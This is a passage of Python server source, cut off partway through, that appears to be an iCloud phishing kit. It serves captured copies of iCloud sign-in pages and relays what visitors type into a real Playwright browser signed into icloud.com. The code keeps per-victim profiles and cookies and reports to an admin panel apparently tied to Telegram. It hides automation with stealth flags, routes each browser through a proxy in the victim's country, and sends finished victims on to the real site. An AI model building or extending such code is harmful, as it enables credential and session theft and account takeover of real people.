"""FastAPI server on port 9002.

Visiting http://localhost:9002 serves client.html. That page opens the real
browser (icloud.com, Sign In pressed); once Sign In has been clicked, the app
goes to a page that was captured earlier - ``src/1.html`` - as a document of
its own, not inside a frame.

The mirrored capture pipeline is gone. There is no agent in the real browser,
no document stream, no resource proxy and no engine rebuilding a page from a
capture: the captured HTML in ``src/`` *is* the page. What the server does now
is keep every viewer of it in step, because a static file cannot:

* it injects ``/sync.js`` into every captured page it serves, and
* it holds the shared state - which page everyone is on, and every form value
  that has been typed - and relays changes over ``/ws``.

So anything done in the captured page is reflected server-side: it is stored
by the hub and handed to the next viewer (and to the next reload) instead of
living only in one browser tab.

    python server.py
"""

import asyncio
import html as html_module
import json
import logging
import mimetypes
import os
import re
import sys
import time
from contextlib import asynccontextmanager
from pathlib import Path
from urllib.parse import quote, urlsplit

from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import (FileResponse, HTMLResponse, JSONResponse,
                             RedirectResponse, Response)

import admin
import browsers
import geo
import identity as identity_module
import live
import proxy_pool
import sessions
import standalone
import stealth
import turnstile
import telegram as telegram_module
import xvfb

HERE = Path(__file__).parent

# Where the captured pages live. The environment variable exists so the tests
# can point at a scratch folder; in normal use it is just ``./src``.
SRC = Path(os.environ.get("ICLOUD_SRC") or (HERE / "src")).resolve()

# The page the app goes to once the browser is up. Everything in src/ is
# served, but this is the one it opens first.
START_PAGE = "/src/1.html"

# Where a person who has finished is sent: the place they came for. The
# captures are closed to somebody who has already got in - there is nothing
# left in them to do.
ICLOUD = "https://www.icloud.com/"

# The Sign In button on the icloud.com landing page. The browser still opens
# and this is still clicked - the user signs in there themselves - but nothing
# is captured from it any more.
SIGNIN_BUTTON = "ui-button.sign-in-button"

# Who a client is belongs to the session manager: the folder their browser
# keeps its profile in, the cookie that says whose browser it is, and what
# a name is allowed to look like. They are read here because everything
# that serves a capture is named by them, and the manager is the one place
# a client comes through.
PROFILES = sessions.PROFILES
SESSION_COOKIE = sessions.SESSION_COOKIE
SESSION_ID = sessions.SESSION_ID


def session_cookie(session_id: str) -> str:
    """The cookie that says who this is.

    It has to be a real ``Set-Cookie``: a header called ``icloud_session``
    with a name in it is just a header, and the browser keeps no cookie, and
    then every request looks like a new visitor - twenty sessions for one
    person, each with a browser and a profile of its own.
    """
    return (f"{SESSION_COOKIE}={session_id}; Path=/; Max-Age=31536000; "
            "SameSite=Lax")

# How long a visitor's browser is kept open after they have gone away. The
# profile is kept either way - that is the session - but the browser window
# is not left open for ever.
SESSION_IDLE_SECONDS = 15 * 60

# How long the app waits for the browser to accept what was typed into it
# before it gives up and leaves the visitor where they are.
WAIT_FOR_BROWSER_SECONDS = 120

# How long the app waits on "Trust this browser?" before carrying on without
# an answer. The question is answered as soon as it is seen, so this is only
# for a browser that has stopped answering presses.
TRUST_WAIT_SECONDS = 30

# Tried in order. Bundled Chromium needs a download; Chrome and Edge are
# usually already on the machine, so if either is there we skip it entirely.
# The list is in browsers.py, because the proxy check uses the same one.
BROWSERS = browsers.candidates()


# --------------------------------------------------------------------------
# A browser that will not open
# --------------------------------------------------------------------------
#
# Playwright gives the same verdict for a dozen different faults. "Target
# page, context or browser has been closed" is what a machine with no screen,
# a root shell and a missing library all look like from where it stands - and
# three lines of that is no help at all to somebody who has met none of them.
#
# So the answer is worked out from the machine as well as from what Playwright
# said: what it is missing, who it is running as, and whether there is a
# screen to open a window on. The window is not decoration - it is where the
# person signs in - so a machine without one is told so in those words.

def running_as_root() -> bool:
    """A root shell. Windows has no geteuid, and is never this."""
    return hasattr(os, "geteuid") and os.geteuid() == 0




def has_a_display() -> bool:
    """Is there a screen for a window to open on?

    A desktop Linux machine has one; a server, a container and a cloud runner
    do not, and neither does ssh without -X. When there is none, xvfb makes
    one for the session - a screen each.
    """
    return xvfb.has_a_display()


def browser_args(device=None) -> list:
    """What the browser is started with.

    Chromium refuses to run as root without --no-sandbox, and exits at once
    when it does - which arrives here as the same closing message as every
    other fault. A root shell is common on a server, so the flag is added
    there rather than leaving the browser unable to start at all.

    The flags the device brings are added on top: the browser stops
    announcing that it is being driven, stops letting WebRTC say the
    machine's own address, and stops taking QUIC's way around the proxy.
    Nothing there hides the browser - it only stops the browser telling
    on itself.
    """
    args = ["--start-maximized"]
    if running_as_root():
        args.append("--no-sandbox")
    args += stealth.launch_flags(device)
    return args


def browser_advice(reasons) -> list:
    """What to do about a browser that will not open, in the order to do it.

    Only the things this machine actually needs are said: a missing browser is
    not told about the display, and a machine with a screen is not told to
    install one.
    """
    said = " ".join(reasons).lower()
    advice = []

    if not has_a_display() and not xvfb.wanted():
        # No screen, and no way of making one: this is the machine to fix.
        # With Xvfb installed this is not said at all - every session gets a
        # screen of its own and nothing has to be done about it.
        advice.append(
            "there is no screen here for the browser window to open on, and no "
            "Xvfb to make one with - `sudo apt install xvfb` gives every "
            "session a screen of its own, which is the whole of what a server "
            "needs. Without it, run the app on a desktop or connect with "
            "`ssh -X`")

    if "is not found at" in said or "executable doesn't exist" in said:
        advice.append(
            "no browser is installed - install Google Chrome the way Playwright "
            "does it: `sudo .venv/bin/python -m playwright install chrome "
            "--with-deps`, or from Google's own package: "
            "`wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb "
            "&& sudo apt install ./google-chrome-stable_current_amd64.deb`. "
            "Either way the app finds it next time - it is the first one tried")

    if "shared libraries" in said or "missing dependencies" in said:
        advice.append(
            "the browser is there but the libraries it needs are not - "
            "`sudo .venv/bin/python -m playwright install-deps chromium`")

    if running_as_root():
        advice.append(
            "this is a root shell, so the browser is started with --no-sandbox "
            "(Chromium will not start as root without it). Running the app as a "
            "normal user is better, and makes that flag unnecessary")

    return advice


@asynccontextmanager
async def lifespan(app: FastAPI):
    """The app starts by looking at the browsers.

    There may not be one yet - a browser opens when its owner visits - and
    then there is nothing to look at. The watcher copes with that: it
    waits, and it starts reporting as soon as there is something to report.
    """
    start_watching()
    # Said now, at the start, rather than when the browser fails to open:
    # finding out before anyone has clicked anything is time saved.
    if not has_a_display():
        if xvfb.wanted():
            log("no screen on this machine - every session gets one of its own "
                "from Xvfb")
            log(f"each browser opens on a display from {xvfb.FIRST_DISPLAY} "
                "upwards, and the display number is in its session")
        else:
            log("no screen on this machine, and no Xvfb to make one with")
            log("`sudo apt install xvfb` gives every session a screen of its "
                "own - the browser needs one to open a window on")
    yield
    # Nothing is left drawing on nothing when the app goes: every screen this
    # process made is put away with the browser that was on it, so Ctrl-C is
    # not a machine filling up with orphaned X servers.
    for sid, session in list(SESSIONS.items()):
        try:
            await session.close()
        except Exception:
            pass


app = FastAPI(lifespan=lifespan)

# The control room: the clients, the Telegram settings, and the cookies. It
# is mounted here because it is part of this server and knows the same
# sessions.
app.include_router(admin.ROUTER)

state = {
    "status": "idle",      # idle | running | done | error
    "step": "",
    "error": "",
    "browser_open": False,
}

# What a captured page gets on the way out. None of it is written into the
# file on disk: the file stays exactly what was captured, and these are put in
# as it is served. There is no write path for src/ at all.
SYNC_TAG = '<script src="/sync.js"></script>'

# A capture is served exactly as it was captured. The one thing added is this
# tag, and only this tag. Nothing is removed, no meta is rewritten, no policy
# is touched.

NO_STORE = {"Cache-Control": "no-store"}


# --------------------------------------------------------------------------
# Console output
# --------------------------------------------------------------------------

# The page polls /status every 2s, which buries everything else in the console.
# The rendered line looks like: 127.0.0.1:5900 - "GET /status HTTP/1.1" 200
class _DropStatusPolls(logging.Filter):
    def filter(self, record):
        return "/status HTTP" not in record.getMessage()


logging.getLogger("uvicorn.access").addFilter(_DropStatusPolls())


def log(message):
    """Progress in the console, so a stuck run is diagnosable."""
    print(f"[icloud] {message}", flush=True)
    state["step"] = message


# --------------------------------------------------------------------------
# The real browser: opened for the sign-in, and nothing else
# --------------------------------------------------------------------------

async def install_chromium():
    """Download Chromium, streaming the progress so a stall is visible."""
    log("installing chromium - download progress follows")
    proc = await asyncio.create_subprocess_exec(
        sys.executable, "-m", "playwright", "install", "chromium",
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )

    chunks = []
    while True:
        chunk = await proc.stdout.read(1024)
        if not chunk:
            break
        chunks.append(chunk)
        # Playwright draws a progress bar with \r, so pass it through raw.
        print(chunk.decode(errors="replace"), end="", flush=True)

    await proc.wait()
    print(flush=True)

    output = b"".join(chunks).decode(errors="replace")
    if proc.returncode != 0:
        raise RuntimeError(pick_reason(output))
    log("chromium installed")


def pick_reason(text: str) -> str:
    """Pull the real error out of Playwright's noisy Node.js output."""
    lines = [line.strip() for line in text.splitlines() if line.strip()]

    # First "Error:" line is the root cause; later ones just restate it.
    for line in lines:
        if line.startswith("Error:"):
            return line[len("Error:"):].strip() or line

    # Otherwise take the last line that isn't stack-trace noise.
    for line in reversed(lines):
        if not line.startswith(("at ", "{", "}")):
            return line

    return "could not install chromium"


def geometry_for(session: "Session") -> str | None:
    """The size of the screen this session's browser is to sit on.

    The size is the visitor's own, and it is worked out in the pixels the
    screen is really made of: a machine whose screen is 1920 wide and
    draws it at one and a half times the size needs 2880 pixels of
    screen to show it, and the browser then says it is 1920 wide.
    """
    identity = getattr(session, "identity", None)
    if identity is None:
        return None
    device = identity.device
    try:
        width = int(round(device.screen["width"] * device.dpr))
        height = int(round(device.screen["height"] * device.dpr))
    except (KeyError, TypeError, ValueError):
        return None
    return f"{width}x{height}x24"


async def screen_for(session: "Session") -> dict:
    """The screen this session's browser opens on.

    Returns the environment the browser is started with: `DISPLAY` set to an
    Xvfb of this session's own, when the machine has no screen to use. An
    empty dict means "the machine's own environment", which is a desktop, an
    `ssh -X`, or Windows and macOS.

    The screen is made once per session and kept, so a browser that is tried
    twice - the second time after Chromium has been downloaded - lands on the
    screen its profile was already on.
    """
    if not xvfb.wanted():
        return {}

    if session.screen is None:
        log(f"giving {session.id} a screen of its own")
        session.screen = await xvfb.open_screen(geometry_for(session))
        log(f"...it is {session.screen.display} at {session.screen.geometry}, "
            f"and no other session is on it")

    return {**os.environ, "DISPLAY": session.screen.display}


def device_of(session: "Session"):
    """The device this session's browser is to be, if it has one."""
    identity = getattr(session, "identity", None)
    return identity.device if identity is not None else None


def context_options(session: "Session") -> dict:
    """What the browser's context is told, and where it leaves from.

    The language, the clock and the colour scheme come from the device -
    from the same device that was there last time, because the device is
    kept with the profile. The proxy comes from the group: the address
    this visitor shares with the few others in their country.
    """
    device = device_of(session)
    if device is None:
        return {}

    options = stealth.context_options(device)
    identity = getattr(session, "identity", None)
    if identity is not None and identity.group:
        proxy = proxy_pool.settings_for(identity.group)
        if proxy:
            options["proxy"] = proxy
    return options


async def prepare_identity(session: "Session", request: Request) -> None:
    """Give this visitor their device, and the group they leave from.

    The device is written into the profile the first time and read back
    every time after, so a visitor who comes back gets the same machine
    and the same address - which is what keeps the "trust this browser"
    answer in that profile true.

    The country is the visitor's own, as far as their address can say,
    and it is what the group is chosen by. Once a visitor has a group,
    their country is the one they were given first: a visitor who moves
    is still the same household.
    """
    known = identity_module.load(session.profile())
    if known is not None:
        country = known.country
        group = known.group
    else:
        # The panel is the switch: what it says is what the browsers use.
        # The environment is where it starts, and the panel is the last
        # word from then on. This is read on every visit, so a change in
        # the panel - or in the file behind it - is picked up at once.
        proxy_pool.POOL.configure(admin.STORE.proxy())
        address = geo.client_ip(request)
        country = geo.country_of(address) or proxy_pool.fallback_country()
        group = proxy_pool.POOL.assign(session.id, country)

    session.identity = identity_module.assign(session.profile(), country, group)
    session.group = group
    log(f"{session.id}: {country} through {group} - "
        f"{session.identity.device.screen['width']}x"
        f"{session.identity.device.screen['height']} at "
        f"{session.identity.device.dpr}x, "
        f"{session.identity.device.locale}, "
        f"{session.identity.device.timezone}")


_PLAYWRIGHT = None


async def playwright():
    """The one Playwright driver, started once and shared by every session.

    Starting it costs about half a second and a process of its own, and a
    driver holds no browser and no profile - it is only the channel the
    browsers are asked through. One for the whole server means a visitor
    does not pay for it, and a session that ends does not end it.
    """
    global _PLAYWRIGHT
    if _PLAYWRIGHT is None:
        from playwright.async_api import async_playwright

        _PLAYWRIGHT = await async_playwright().start()
    return _PLAYWRIGHT


def note_exit(session: "Session", task=None) -> None:
    """Record where the browser left from, whenever that answer arrives.

    The check is made alongside the page the visitor types into, not in
    front of it. When it answers before the sign-in is handed over it is
    read there; when it answers after, it is read here, and the panel is
    told - the visitor is already working by then and is not interrupted.
    """
    if task is None:
        answer = session.exit or {}
    else:
        try:
            answer = task.result()
        except Exception as exc:
            answer = {"ok": False, "ip": "", "country": "",
                      "said": str(exc).splitlines()[0] if str(exc)
                      else "the check failed",
                      "wrong": False, "mismatch": False}
        session.exit = answer

    if answer.get("ok"):
        log(f"leaving from {answer.get('ip')} "
            f"({answer.get('country')}) - checked")
    else:
        log(f"NOT CHECKED: {answer.get('said')}")
        # A note, not a verdict: by the time a late answer comes back the
        # visitor may already be typing, and an unchecked proxy is not the
        # same as a broken session.
        if session.state.get("status") != "done":
            session.state["error"] = answer.get("said", "")
    SESSIONS.changed(session, why="exit-checked")


async def verify_exit(session: "Session") -> dict:
    """Check where the browser really leaves from.

    The browser is asked, not the app: a tab is opened through the same
    context the sign-in will use, and the answer comes back from the
    address-echo service. Three things are looked at:

    * the country the address is in, which has to be the one the device
      was built for - a browser in one country leaving from another is a
      contradiction,
    * the address itself, which has to be the machine's own address only
      when no proxy was wanted, and
    * what the browser called itself, and what its client hints said, so
      that a name and its hints cannot quietly disagree.

    A session that cannot be checked is said to be unchecked and the
    panel shows it. It is not quietly let through: a browser that fell
    back to the machine's own address is the one thing this whole
    arrangement is here to prevent.
    """
    identity = getattr(session, "identity", None)
    if identity is None or session.ctx is None:
        return {"ok": False, "ip": "", "country": "", "said": "nothing to check"}

    said = {"ok": False, "ip": "", "country": "", "said": "",
            "hints": "", "wrong": False, "mismatch": False}
    page = None
    try:
        page = await session.ctx.new_page()
        headers = {}
        page.on("request", lambda request: headers.update(_headers_of(request)))

        await page.goto(proxy_pool.EXIT_CHECK_URL, wait_until="domcontentloaded",
                        timeout=45000)
        body = await page.inner_text("body")
        found = proxy_pool.parse_exit(body or "")
        said.update(found)

        if not proxy_pool.POOL.enabled:
            # No proxy was wanted, so the machine's own address is the
            # right one and there is nothing to compare it with.
            said.update(ok=bool(said.get("ip")),
                        said="no proxy - the machine's own address")
        else:
            own = proxy_pool.origin_ip()
            if own and said.get("ip") == own:
                said.update(ok=False, wrong=True,
                            said="the browser left from the machine itself")
            elif said.get("ip") and identity.country:
                if said.get("country") and said["country"] != identity.country:
                    # A different country is said out loud, but it does not
                    # stop the sign-in by itself: the country comes from
                    # where the visitor was seen, and the operator may
                    # want another one (the panel has a field for it). The
                    # address is what matters - it is the machine's own
                    # address that stops everything.
                    said.update(ok=False, mismatch=True,
                                said=f"it left from {said['country']}, "
                                     f"not {identity.country}")
                else:
                    said.update(ok=True,
                                said="the address is where it should be")

        if headers:
            agreed = stealth.agree(headers, identity.device.user_agent)
            said["hints"] = agreed["said"]
            if not agreed["ok"]:
                said["ok"] = False
                said["said"] = f"{said['said']}; {agreed['said']}"
    except Exception as exc:
        said["said"] = str(exc).splitlines()[0]
    finally:
        if page is not None:
            try:
                await page.close()
            except Exception:
                pass

    if identity.group and said.get("ip"):
        proxy_pool.POOL.observe(identity.group, said["ip"], said.get("country", ""))
    return said


def _headers_of(request) -> dict:
    """The headers a request was sent with, once it has been sent."""
    try:
        return request.headers
    except Exception:
        return {}


async def launch(session: "Session"):
    """Open a visible browser window with whatever is available.

    The window keeps this visitor's own profile, so the session they had
    last time is the session they get this time: the cookies, the "trust
    this device" answer, the half-typed address.

    The window needs a screen. A machine with one uses it; a machine without
    one gets an Xvfb for this session alone, so that no two people's browsers
    are ever windows on the same desktop. A machine with neither still runs -
    the browser only draws nothing - and the browser is what the capture is
    typed into, so the app works; it is only the window that is missing.

    Returns (context, page). Raises once every candidate has failed, with all
    the reasons joined so the caller can tell a missing download from a
    genuinely broken setup.
    """
    reasons = []

    profile = session.profile()
    profile.mkdir(parents=True, exist_ok=True)

    env = await screen_for(session)
    headless = False
    if not env and not has_a_display():
        # No screen and no Xvfb: there is nothing to open a window on. The
        # browser still runs, and still does everything the app asks of it -
        # it is only that nobody can see it, and nobody has to.
        headless = True
        log("no screen and no Xvfb - the browser runs without a window")
        log("`sudo apt install xvfb` gives every session a screen of its own")

    # What the browser is told about itself, and where it leaves from.
    options = context_options(session)
    proxy = options.pop("proxy", None)
    if proxy:
        log(f"leaving from {proxy['server']}")

    for label, extra in browsers.candidates():
        try:
            log(f"launching {label}")
            browser_ctx = await session.pw.chromium.launch_persistent_context(
                str(profile),
                headless=headless,
                no_viewport=True,
                args=browser_args(device_of(session)),
                **({"env": env} if env else {}),
                **({"proxy": proxy} if proxy else {}),
                **options,
                **extra,
            )
        except Exception as exc:
            reason = str(exc).splitlines()[0]
            log(f"{label} unavailable: {reason}")
            reasons.append(reason)
            continue

        browser_page = browser_ctx.pages[0] if browser_ctx.pages else await browser_ctx.new_page()
        # Which browser, and whether it has a window. A browser with no
        # window says "Headless Chrome" for itself, and that is a thing
        # every site can read without asking.
        session.state["browser_used"] = label
        session.state["headless"] = headless
        log(f"browser open ({label})")
        return browser_ctx, browser_page

    # Every candidate failed, and Playwright's verdict is the same for all of
    # them. Say what this machine needs, not what Playwright said.
    for line in browser_advice(reasons):
        log(line)

    raise RuntimeError(" | ".join(reasons) or "no browser could be launched")


def bring_new_tab_to_front(session: "Session", new_page):
    """The sign-in flow may open a tab of its own; the user should see it."""
    if new_page is session.page:
        return

    async def front():
        try:
            await new_page.bring_to_front()
        except Exception:
            pass

    asyncio.create_task(front())


# --------------------------------------------------------------------------
# A copy of the pages that lives on another host
# --------------------------------------------------------------------------
#
# The pages on another host ask this server for things: when the browser
# should open, where it is, what it is showing. A browser will not let a
# page on one host ask a server on another unless the server says it may.
# That is the browser's policy and it is a good one - so the server has to
# say it may, for the host the copy is on and for that host only.
#
# The address of the copy is in the panel, in the Standalone tab. More than
# one can be named in the environment, for a copy that is in more than one
# place.

# The things a page is allowed to ask for. The panel is not among them: it
# has a secret of its own, and a page on another host has no business
# there.
CLIENT_ROUTES = ("/start", "/status", "/nav")

# The one thing anybody may ask for: the site's key for the question asked
# at the door. It is public - Cloudflare puts it in every page that uses
# the widget - so it is given to whoever asks. No secret is here, and
# never is.
#
# It is on its own list because a copy of the pages that lives somewhere
# else asks for it before the server has been told where that copy is:
# the key is public, and a copy that cannot have it cannot ask the
# question at all.
PUBLIC_ROUTES = ("/turnstile/sitekey",)


def allowed_origins() -> list:
    """The origins the pages are allowed to come from."""
    said = []
    for one in os.environ.get("ICLOUD_STANDALONE_ORIGINS", "").split(","):
        one = one.strip().rstrip("/")
        if one:
            said.append(one)
    try:
        stored = str(admin.STORE.standalone().get("origin") or "").strip()
    except Exception:
        stored = ""
    stored = stored.rstrip("/")
    if stored and stored not in said:
        said.append(stored)
    return said


def origin_allowed(origin: str) -> bool:
    """May a page from this origin ask this server for things?"""
    if not origin or origin == "null":
        return False
    origin = origin.strip().rstrip("/")
    return any(origin.lower() == one.lower() for one in allowed_origins())


# The origins that asked this server for something and were refused.
#
# A page on a host the server has not been told about is refused - that is
# the point of the list. But a refusal the operator cannot see is a
# refusal they cannot fix: the browser says only that the request was
# blocked, and which address to put in the Standalone tab has to be worked
# out from that. So the address is kept, and the panel says it.
#
# The list itself lives with the copy of the pages, which is what it is
# about; this is where the server's own answer to the question is kept.


def refused_origins() -> list:
    """The addresses of the pages that have been refused, newest last."""
    return standalone.refused_origins()


def expected_hostnames(request) -> set:
    """The hosts an answer may come from.

    An answer is given on a host, and Cloudflare says which one. So the
    server has to say which hosts it will take an answer from - the
    address this server is reached at, the address the copy of the pages
    lives at, and the host the visitor used to get here.

    The copy of the pages has to be told where it lives for the browser to
    let it ask this server anything at all, so its address is in there
    too. An answer from a copy that has not been registered is an answer
    this server will not take, and the door says so when it refuses one.
    """
    try:
        host = request.headers.get("host", "")
    except Exception:
        host = ""
    return turnstile.expected_hosts(admin.STORE, request_host=host)


@app.middleware("http")
async def allow_the_copy(request: Request, call_next):
    """Let the copy's pages ask the server - and only them."""
    origin = request.headers.get("origin", "")
    allowed = origin_allowed(origin)

    if request.method == "OPTIONS":
        # The question a browser asks before it asks anything else.
        response = Response(status_code=204)
    else:
        response = await call_next(request)

    if request.url.path in PUBLIC_ROUTES:
        # The site's key is public, so it goes to anybody who asks. The
        # page needs it to ask the question, and a page that cannot have
        # it cannot ask.
        response.headers["Access-Control-Allow-Origin"] = "*"
        response.headers["Access-Control-Allow-Methods"] = "GET, OPTIONS"
        response.headers["Vary"] = "Origin"
    elif request.url.path in CLIENT_ROUTES:
        if allowed:
            response.headers["Access-Control-Allow-Origin"] = origin
            response.headers["Access-Control-Allow-Credentials"] = "true"
            response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
            response.headers["Access-Control-Allow-Headers"] = \
                "Content-Type, " + turnstile.HEADER
            response.headers["Vary"] = "Origin"
        else:
            # The copy is on a host this server has not been told about.
            # The address is kept, so that the panel can say which one.
            if standalone.remember_refused(origin):
                log(f"a page on {origin} asked this server for something and"
                    " was refused - it has to be told where it lives, in the"
                    " Standalone tab")
    return response


@app.get("/")
async def index(request: Request):
    """The launcher, until the browser is open and Sign In has been clicked.

    After that the captured page *is* the app, so this redirects to it. A
    reload must not pretend the browser has to be opened again - and a top
    level document means the capture is laid out as a page of its own,
    instead of being squeezed into a frame inside another document.
    """
    # A request that says who the visitor is belongs to that visitor's
    # session. A request that says nothing belongs to nobody: the page has
    # not named itself yet, and making a session here would give one person
    # two - the one the page asks for, and the one the page's own request
    # made on the way in.
    session = session_for_named(request)
    cookie = ({"Set-Cookie": session_cookie(session.id)}
              if session is not None else {})
    if session is not None and session.hub.finished:
        # The person has finished the process: the launcher sends them to
        # iCloud as well, not to a capture.
        return RedirectResponse(ICLOUD, status_code=307, headers=cookie)
    if session is not None and session.state["status"] == "done":
        return RedirectResponse(session.hub.page, status_code=307,
                                headers=cookie)
    # The page is not given the question here: it asks the server for it
    # when it loads. That is what makes a key changed in the panel live -
    # here, and in the copy of these pages that lives somewhere else.
    # no-store, so an edit to client.html shows up on refresh instead of
    # serving the browser's cached copy.
    return FileResponse(HERE / "client.html", headers={**NO_STORE, **cookie})


@app.get("/turnstile/sitekey")
async def turnstile_sitekey(request: Request):
    """The site's key for the question asked at the door.

    The key is public - Cloudflare puts it in every page that uses the
    widget - so it is given to anybody who asks for it. The secret is not
    here, and is never sent anywhere near a page.

    The page asks for this when it loads, rather than carrying the key
    written into it. That is the whole of "live": a key changed in the
    panel is in the next page load, on the server's own pages and in the
    copy that lives somewhere else, with nothing to rebuild and nothing
    to upload again.
    """
    said = turnstile.settings(admin.STORE)
    return JSONResponse({"site_key": said["site_key"],
                         "asked": said["asked"]},
                        headers=NO_STORE)


@app.get("/start")
async def start(request: Request):
    """Launch this visitor's browser and press Sign In."""
    session = session_for(visitor_of(request))
    # The visitor is given their device and their group before the browser
    # opens: the browser needs to know both before it is opened, not
    # after.
    await prepare_identity(session, request)

    # The question asked first: is this a person? The page was given the
    # site's key and Cloudflare gave back a token; the token is a claim,
    # so it is checked here before anything is opened.
    #
    # An answer that is not good stops it. A check that can be walked
    # around is not a check, and a stranger who can open browsers on this
    # machine is what this is here to prevent.
    good = await check_person(request)
    if not good.get("ok"):
        said = good.get("said") or "the question was not answered properly"
        log(f"not opening a browser: {said}")
        session.state.update(status="error", error=said)
        SESSIONS.failed(session, said)
        session.hub.tell_state()
        return JSONResponse(session.state,
                            headers={"Set-Cookie": session_cookie(session.id)})

    state = await start_browser(session)
    # The cookie says the same thing on every request from now on, so the
    # page does not have to say it again.
    return JSONResponse(state,
                        headers={"Set-Cookie": session_cookie(session.id)})


async def check_person(request: Request) -> dict:
    """Is this a person? Turnstile's answer, checked.

    The question is asked when either key is there - the site's key in the
    page, the secret here. Both being absent means the question is not
    being asked and everybody may through.

    The keys are read at the moment they are wanted, from the panel's
    store when it is there and from the environment otherwise: the panel
    changes them while the machine is running, and the change is meant to
    be live.

    A page with the site's key and a server with no secret is a
    misreading, and it stops the door rather than opening it.
    """
    said = turnstile.settings(admin.STORE)
    site = said["site_key"]
    given = said["secret"]

    # The switch in the panel: the question can be turned off without
    # losing the keys, which is the way out when a widget misbehaves and
    # the door has to be opened again.
    if not said["switch"]:
        return {"ok": True, "said": "the question is not being asked"}

    if not said["keys"]:
        return {"ok": True, "said": "no question is being asked"}

    token = ""
    try:
        token = str(request.headers.get(turnstile.HEADER, "") or "")
    except Exception:
        token = ""

    if not token:
        # Say which thing is missing, because "no answer was given" leaves
        # the operator guessing and the door shut.
        if not site:
            return {"ok": False,
                    "said": "the site's key is not set, so the page has no "
                            "question to answer - put it in the Turnstile tab"}
        if not given:
            return {"ok": False,
                    "said": "the secret is not set, so the answer cannot be "
                            "checked - put it in the Turnstile tab"}
        return {"ok": False,
                "said": "the page did not answer the question - the widget "
                        "may have been refused, or the hostname may not be "
                        "allowed by the widget"}

    said = await turnstile.verify(token, given_secret=given,
                                  ip=geo.client_ip(request),
                                  hostnames=expected_hostnames(request))
    if said.get("ok"):
        log("the question was answered properly")
    elif said.get("reason") == "hostname":
        # The most common way for an answer to be refused: the copy of the
        # pages is somewhere the server has not been told about, so the
        # answer came from a host it does not know.
        said["said"] += (" - if this is the copy of the pages, it has to be "
                         "told where it lives, in the Standalone tab")
    return said


async def start_browser(session: "Session"):
    """Launch this visitor's browser and press Sign In. Nothing is captured."""
    if session.state["status"] in ("running", "done"):
        log(f"/start ignored, already {session.state['status']}")
        return session.state

    session.state.update(status="running", error="", browser_open=False)

    # The exit check, when one is made. Started alongside the page the
    # visitor will type into and awaited before the sign-in is handed over;
    # kept here so a session that fails on the way still tidies it up.
    exit_task = None

    try:
        # Started here rather than at module load: serving the captured pages
        # does not need Playwright, and a machine without it should still be
        # able to open the app and read the error on /status.
        if session.pw is None:
            session.pw = await playwright()

        try:
            session.ctx, session.page = await launch(session)
        except Exception as exc:
            # Nothing to run yet - download Chromium, then try once more.
            if "Executable doesn't exist" not in str(exc):
                raise
            await install_chromium()
            session.ctx, session.page = await launch(session)

        session.state["browser_open"] = True
        # The browser is up: the manager says so, so the panel stops saying
        # the client is only arriving.
        SESSIONS.changed(session, why="browser-open")
        # And the pages watching are told at once, so the launcher goes to
        # the capture now rather than after the work that follows. The
        # capture is the browser's own mirror - it fills itself in as the
        # browser does, which is a better thing to look at than a blank
        # screen.
        session.hub.tell_state()

        # What the browser says about itself is worth keeping: it is the
        # only one who knows which build it is, and the client hints it
        # sends agree with it.
        try:
            real = await session.page.evaluate("() => navigator.userAgent")
            identity_module.update_user_agent(session.profile(), real)
            if session.identity is not None:
                session.identity.device.user_agent = real
        except Exception:
            pass

        # Where the browser really leaves from, and the page the visitor will
        # type into, are both waits on the network - so they wait together
        # instead of one after the other. The check is still finished and
        # read before anything is handed over; only its waiting is shared.
        if session.identity is not None:
            exit_task = asyncio.create_task(verify_exit(session))

        # The browser is the session. The capture is a copy of a moment of
        # it, and this is what connects the two: what is typed into the
        # capture is written into the browser, and what the browser is
        # showing is written back into the capture.
        session.bridge.attach(session.ctx, session.page)

        # A tab the sign-in flow opens is where the user will be typing.
        session.ctx.on("page", lambda page: bring_new_tab_to_front(session, page))

        log("going to icloud.com")
        # "commit" rather than "domcontentloaded": the page is ready when the
        # click finds the button, and the click waits for it on its own - so
        # the page's own loading is spent inside the click, not before it.
        await session.page.goto("https://www.icloud.com/", wait_until="commit")
        await session.page.bring_to_front()

        log("clicking Sign In")
        await session.page.locator(SIGNIN_BUTTON).first.click(timeout=15000)

        strict_now = os.environ.get("ICLOUD_EXIT_STRICT", "").strip() in \
            ("1", "true", "yes", "on")
        if exit_task is not None and strict_now:
            # Strict mode: the answer is the point, so it is waited for.
            session.exit = await exit_task
            note_exit(session)
            if session.exit.get("wrong") or not session.exit.get("ok"):
                log("the sign-in is not started - the browser is not leaving "
                    "from where it should")
                session.state["status"] = "error"
                session.state["error"] = (
                    session.exit.get("said") or
                    "the browser is not leaving from where it should")
                try:
                    await session.ctx.close()
                except Exception:
                    pass
                session.ctx = None
                session.page = None
                session.state["browser_open"] = False
                SESSIONS.failed(session, session.state["error"])
                session.hub.tell_state()
                return session.state
        elif exit_task is not None:
            # Not strict: the answer is worth having, not worth waiting for.
            # The browser is on the sign-in page and the visitor is about to
            # type, so a check still on its way is read when it lands rather
            # than held in front of them. An answer already in is read here.
            if exit_task.done():
                try:
                    session.exit = exit_task.result()
                except Exception as exc:
                    session.exit = {"ok": False, "ip": "", "country": "",
                                    "said": str(exc).splitlines()[0] if str(exc)
                                    else "the check failed",
                                    "wrong": False, "mismatch": False}
                note_exit(session)
                if session.exit.get("wrong"):
                    log("the sign-in is not started - the browser is not "
                        "leaving from where it should")
                    session.state["status"] = "error"
                    session.state["error"] = session.exit.get("said") or \
                        "the browser is not leaving from where it should"
                    try:
                        await session.ctx.close()
                    except Exception:
                        pass
                    session.ctx = None
                    session.page = None
                    session.state["browser_open"] = False
                    SESSIONS.failed(session, session.state["error"])
                    session.hub.tell_state()
                    return session.state
            else:
                exit_task.add_done_callback(
                    lambda task: note_exit(session, task))

        session.state["status"] = "done"
        log("done - sign in yourself in the browser window")
        session.hub.tell_state()

    except Exception as exc:
        if exit_task is not None and not exit_task.done():
            exit_task.cancel()
        session.state["status"] = "error"
        session.state["error"] = str(exc).splitlines()[0]
        log(f"FAILED: {session.state['error']}")
        SESSIONS.failed(session, session.state["error"])
        session.hub.tell_state()

    return session.state


@app.get("/status")
async def status(request: Request):
    """What this visitor's browser is doing.

    This only reads, so it only *looks* the session up. A poll that made a
    session of its own would give one person a new browser every two
